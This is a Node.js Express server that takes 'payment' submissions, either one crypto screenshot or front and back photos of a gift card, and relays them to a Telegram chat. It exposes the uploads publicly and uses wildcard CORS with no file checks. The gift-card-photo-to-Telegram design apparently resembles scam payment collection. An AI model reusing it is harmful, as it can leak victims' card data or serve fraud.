const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const path = require('path');
const fs = require('fs');

const app = express();
// very simple CORS allowance for demo
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});
// make sure upload directory exists
fs.mkdirSync(path.join(__dirname, 'uploads/'), { recursive: true });
const upload = multer({ dest: path.join(__dirname, 'uploads/') });

// serve uploaded files so we can fall back to URLs
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

async function sendPhoto(filePath, caption) {
  const FormData = require('form-data');
  const form = new FormData();
  form.append('chat_id', CHAT_ID);
  form.append('photo', fs.createReadStream(filePath));
  form.append('caption', caption);
  const res = await fetch(`${TELEGRAM_API}/sendPhoto`, { method: 'POST', body: form });
  return res;
}

app.post('/submit-payment', upload.array('images', 2), async (req, res) => {
  try {
    const { type, name, amount } = req.body;
    const files = req.files || [];

    // validation rules
    if (type === 'crypto') {
      if (files.length !== 1) {
        return res.status(400).send('Crypto payments require exactly one image');
      }
    } else if (type === 'giftcard') {
      if (files.length < 1 || files.length > 2) {
        return res.status(400).send('Gift card payments require one or two images');
      }
    } else {
      return res.status(400).send('Unknown transaction type');
    }

    const captionBase = `New Transaction\n\nType: ${type === 'crypto' ? 'Crypto' : 'Gift Card'}\nUser: ${name}\nAmount: ${amount}`;

    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      try {
        await sendPhoto(file.path, captionBase);
      } catch (err) {
        console.error('Telegram photo send failed', err);
        throw err;
      }
    }

    res.send('ok');
  } catch (err) {
    console.error('primary send failed, attempting fallback', err);
    // fallback: send links to uploaded files
    try {
      const files = req.files || [];
      let text = `New Transaction\n\nType: ${req.body.type === 'crypto' ? 'Crypto' : 'Gift Card'}\nUser: ${req.body.name}\nAmount: ${req.body.amount}\n`;
      if (files.length) {
        text += '\n';
        files.forEach((f, idx) => {
          const label = req.body.type === 'giftcard' ? (idx === 0 ? 'Front Image' : 'Back Image') : 'Image';
          text += `${label}:\n${req.protocol}://${req.get('host')}/uploads/${f.filename}\n\n`;
        });
      }
      await fetch(`${TELEGRAM_API}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
      res.send('ok');
    } catch (e2) {
      console.error('fallback also failed', e2);
      res.status(500).send('failed to send to telegram');
    }
  }
});

app.listen(3000, () => console.log('Server listening on port 3000'));